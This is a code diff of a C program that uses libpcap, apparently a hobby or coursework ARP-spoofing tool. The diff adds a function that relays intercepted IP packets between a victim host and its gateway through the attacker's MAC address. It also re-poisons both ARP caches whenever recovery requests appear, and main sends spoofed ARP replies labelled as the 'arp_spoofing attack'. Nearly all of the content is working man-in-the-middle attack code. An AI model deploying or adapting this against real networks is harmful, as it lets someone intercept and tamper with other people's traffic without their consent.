@@ -33,7 +33,7 @@ int getattackerinfo(sockaddr_in * attacker_ip , unsigned char *attacker_mac , so
 //attacker's mac_address       
 	memset(&ifr,0x00,sizeof(ifr));
 	strcpy(ifr.ifr_name, (const char *)dev);
-	printf("%s",ifr.ifr_name);
+	printf("%s\n",ifr.ifr_name);
         ifr.ifr_addr.sa_family=AF_INET;
         if(ioctl(sock,SIOCGIFHWADDR,&ifr) != 0 )
 	{
@@ -144,78 +144,6 @@ int arp_reply(pcap_t * handle, unsigned char * attacker_mac, unsigned char * vic
 	return 0;
 }
 
-int find_arp_request(pcap_t * handle, unsigned char * attacker_mac, sockaddr_in * attacker_ip, in_addr * source_ip1, in_addr * source_ip2, unsigned char * source_mac1, unsigned char * source_mac2)
-{
-	int result;
-	struct pcap_pkthdr * header;
-	const u_char *data;
-	iphdr * cmp_ip;	
-	ether_header * cmp_ethernet;
-	ether_arp * cmp_arp;
-	
-	
-	while(1)
-	{
-		
-		result=pcap_next_ex(handle, &header, &data);
-		if(result != 1)
-			continue;
-	
-		cmp_ethernet=(ether_header *)data;
-		if(ntohs(cmp_ethernet->ether_type) !=0x0806)
-		{
-			if(ntohs(cmp_ethernet->ether_type) != 0x0800)
-				 continue;
-			cmp_ip=(iphdr *)(data+14);
-	
-			if(memcmp(&cmp_ip->saddr,source_ip1,sizeof(in_addr)) !=0 && memcmp(&cmp_ip->saddr,source_ip2,sizeof(in_addr)) !=0 )
-				continue;
-			if(memcmp(&cmp_ip->daddr,source_ip1,sizeof(in_addr)) ==0)
-			{	
-				memcpy(cmp_ethernet->ether_shost,attacker_mac,sizeof(ETH_ALEN));
-				memcpy(cmp_ethernet->ether_dhost, source_mac1,sizeof(ETH_ALEN)); 
-				while(1)
-				{
-					if(pcap_sendpacket(handle, data, cmp_ip->tot_len+14) == 0)
-						break;
-				}
-			
-			}
-
-			else if(memcmp(&cmp_ip->daddr,source_ip2,sizeof(in_addr)) ==0 )
-			{
-				memcpy(cmp_ethernet->ether_shost, attacker_mac, sizeof(ETH_ALEN));
-				memcpy(cmp_ethernet->ether_dhost, source_mac2,sizeof(ETH_ALEN));
-				while(1)
-				{
-					if(pcap_sendpacket(handle, data, cmp_ip->tot_len+14) == 0)
-						break;
-				}
-
-			}
-			
-			continue;		
-		}
-
-		cmp_arp=(ether_arp *)(data+14);
-	
-		if(ntohs(cmp_arp->arp_op) != ARPOP_REQUEST)
-			continue;
-
-		if(memcmp(cmp_arp->arp_tpa, source_ip1,sizeof(in_addr)) != 0 && memcmp(cmp_arp->arp_tpa,source_ip2,sizeof(in_addr)) != 0)
-			continue;
-	
-		if(memcmp(cmp_arp->arp_spa, source_ip1,sizeof(in_addr)) == 0 || memcmp(cmp_arp->arp_spa,source_ip2,sizeof(in_addr)) == 0)
-		{
-			break;
-		}
-
-printf("a");
-	}
-
-	return 0;	
-}
-
 int arp_request_uni(pcap_t * handle, unsigned char * attacker_mac, in_addr * fake_ip ,in_addr * dest_ip, unsigned char * dest_mac)
 {
 
@@ -243,7 +171,7 @@ int arp_request_uni(pcap_t * handle, unsigned char * attacker_mac, in_addr * fak
 	memcpy(arp_header.arp_tpa,dest_ip,sizeof(in_addr));	
 	memcpy(arp_reqpack_uni+14,&arp_header,sizeof(ether_arp));
 	while(1)
-	{
+	{	
 		if(pcap_sendpacket(handle, arp_reqpack_uni, sizeof(ether_arp)+sizeof(ether_header)) == 0)
 			break;
 	}
@@ -251,6 +179,147 @@ int arp_request_uni(pcap_t * handle, unsigned char * attacker_mac, in_addr * fak
 	return 0;
 
 }
+
+int find_arp_request_n_ip_relay(pcap_t * handle, unsigned char * attacker_mac, sockaddr_in * attacker_ip, in_addr * source_ip1, in_addr * source_ip2, unsigned char * source_mac1, unsigned char * source_mac2)
+{
+	int result;
+	struct pcap_pkthdr * header;
+	const u_char *data;
+	iphdr * cmp_ip;	
+	ether_header * cmp_ethernet;
+	ether_arp * cmp_arp;
+	
+	
+	while(1)
+	{	
+
+		result=pcap_next_ex(handle, &header, &data);
+		if(result != 1)
+		{
+			continue;
+		}
+	
+		cmp_ethernet=(ether_header *)data;
+
+		if(ntohs(cmp_ethernet->ether_type) !=0x0806)
+		{
+			if(ntohs(cmp_ethernet->ether_type) != 0x0800)
+			{
+				
+				 continue;
+			}
+
+			cmp_ip=(iphdr *)(data+14);
+
+			if(memcmp(&cmp_ip->saddr,source_ip1,sizeof(in_addr)) ==0  && memcmp(cmp_ethernet->ether_shost,source_mac1,sizeof(ETH_ALEN)) ==0 && memcmp(&cmp_ip->daddr,&attacker_ip->sin_addr,sizeof(in_addr)) !=0 && memcmp(cmp_ethernet->ether_dhost, attacker_mac,sizeof(ETH_ALEN)) == 0)
+			{
+							
+				u_char * pktdata= (u_char *)malloc(ntohs(cmp_ip->tot_len)+14);
+				memcpy(pktdata, data, ntohs(cmp_ip->tot_len)+14);
+				cmp_ethernet=(ether_header *)pktdata;
+				
+				for(int i=0;i<6;i++) 
+				{
+					cmp_ethernet->ether_shost[i]=attacker_mac[i];
+					cmp_ethernet->ether_dhost[i]=source_mac2[i];	
+				}
+				
+				
+				while(1)
+				{
+			
+
+					if(pcap_sendpacket(handle, pktdata, ntohs(cmp_ip->tot_len)+14) == 0)
+					{	
+						free(pktdata);
+						break;
+					}
+					
+				}
+
+				
+			}
+			else if(memcmp(&cmp_ip->daddr,source_ip1,sizeof(in_addr)) ==0 &&memcmp(cmp_ethernet->ether_shost,source_mac2,sizeof(ETH_ALEN)) ==0 && memcmp(cmp_ethernet->ether_dhost,attacker_mac, sizeof(ETH_ALEN)) ==0 )
+			{
+
+				u_char * pktdata= (u_char *)malloc(ntohs(cmp_ip->tot_len)+14);
+				memcpy(pktdata, data, ntohs(cmp_ip->tot_len)+14);
+				cmp_ethernet=(ether_header *)pktdata;
+
+				for(int i=0;i<6;i++)
+				{
+					cmp_ethernet->ether_shost[i]=attacker_mac[i];
+					cmp_ethernet->ether_dhost[i]=source_mac1[i];	
+				}
+
+				while(1)
+				{  
+					if(pcap_sendpacket(handle, pktdata, ntohs(cmp_ip->tot_len)+14) == 0)
+					{		
+						free(pktdata);
+						break;
+					}
+					
+				}
+
+				
+			}
+	
+			continue;			
+		}
+
+	
+		cmp_arp=(ether_arp *)(data+14);
+	
+		if(ntohs(cmp_arp->arp_op) != ARPOP_REQUEST)
+		{
+			continue;
+		}
+
+		if(memcmp(cmp_arp->arp_tpa, source_ip1,sizeof(in_addr)) != 0 && memcmp(cmp_arp->arp_tpa,source_ip2,sizeof(in_addr)) != 0)
+			continue;
+	
+		if(memcmp(cmp_arp->arp_spa, source_ip1,sizeof(in_addr)) == 0)
+		{
+			
+			if(memcmp(cmp_ethernet->ether_dhost, attacker_mac,sizeof(ETH_ALEN)) ==0 ){
+				arp_reply(handle,attacker_mac, cmp_ethernet->ether_shost, source_ip2, source_ip1);
+				printf("victim UNICAST recovery.\n");
+
+			continue;
+			}
+			else
+			{
+				arp_request_uni(handle, attacker_mac, source_ip2, source_ip1, source_mac1);
+				arp_request_uni(handle, attacker_mac, source_ip1, source_ip2, source_mac2); 
+				printf("victim BROADCAST recovery.\n");
+			}
+				
+			continue;
+		}
+
+		if(memcmp(cmp_arp->arp_spa,source_ip2,sizeof(in_addr)) == 0)
+		{
+			if(memcmp(cmp_ethernet->ether_dhost, attacker_mac,sizeof(ETH_ALEN)) ==0)
+			{
+				arp_reply(handle,attacker_mac, cmp_ethernet->ether_shost, source_ip1, source_ip2);
+				printf("gateway UNICAST recovery.\n");
+			}
+			else
+			{
+				arp_request_uni(handle, attacker_mac, source_ip2, source_ip1, source_mac1);
+				arp_request_uni(handle, attacker_mac, source_ip1, source_ip2, source_mac2); 
+				printf("gateway BROADCAST recovery.\n");
+			}
+			continue;
+		}
+
+	}
+
+	return 0;	
+}
+
+
 
 
 
@@ -280,7 +349,7 @@ int main(int argc, char * argv[])
 	gateway_mac=(unsigned char *)malloc(ETH_ALEN);
 	attacker_ip=(sockaddr_in *)malloc(16);
 	gateway_ip=(sockaddr_in *)malloc(16);
-	attacker_mac=(unsigned char  *)malloc(14);
+	attacker_mac=(unsigned char  *)malloc(ETH_ALEN);
 	
 
 
@@ -304,7 +373,6 @@ int main(int argc, char * argv[])
 		printf("fail to get attacker info ");
 		return -1;
 	}
-
 	
 	while(1)                 // get sender mac, receiver mac
 	{
@@ -314,7 +382,7 @@ int main(int argc, char * argv[])
 		for(t=0;t<100;t++)
 		{
 
-			printf("CC");
+
 			result=pcap_next_ex(handle, &header, &data);
 			if(result != 1)
 				continue;
@@ -356,20 +424,13 @@ int main(int argc, char * argv[])
 	
 
 	
-
 	 arp_reply(handle, attacker_mac, victim_mac, &gateway_ip->sin_addr, &victim_ip);   // sender arp_spoofing attack
 	
 	 arp_reply(handle, attacker_mac, gateway_mac, &victim_ip, &gateway_ip->sin_addr);     // receiver arp_spoofing attack
 	
 
-	while(1)
-	{
-		find_arp_request(handle, attacker_mac, attacker_ip, &victim_ip, &gateway_ip->sin_addr,victim_mac,gateway_mac);
-			printf("B");
-		arp_request_uni(handle, attacker_mac, &gateway_ip->sin_addr, &victim_ip, victim_mac);
-		arp_request_uni(handle, attacker_mac, &victim_ip, &gateway_ip->sin_addr, gateway_mac); 
-			
-	}
+	find_arp_request_n_ip_relay(handle, attacker_mac, attacker_ip, &victim_ip, &gateway_ip->sin_addr,victim_mac,gateway_mac);
+		
 
    
 	return 0;
